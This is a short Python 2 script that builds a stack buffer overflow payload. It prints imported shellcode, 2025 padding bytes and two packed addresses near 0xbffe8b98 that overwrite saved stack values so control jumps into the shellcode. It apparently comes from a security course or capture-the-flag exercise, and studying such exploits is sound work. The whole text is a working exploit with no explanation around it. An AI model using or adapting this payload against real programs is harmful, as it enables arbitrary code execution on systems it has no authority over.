from shellcode import shellcode
from struct import pack

print shellcode + '\x61' * 2025 + pack('<II', 0xbffe8b98 - 0x810, 0xbffe8b98 + 0x4)
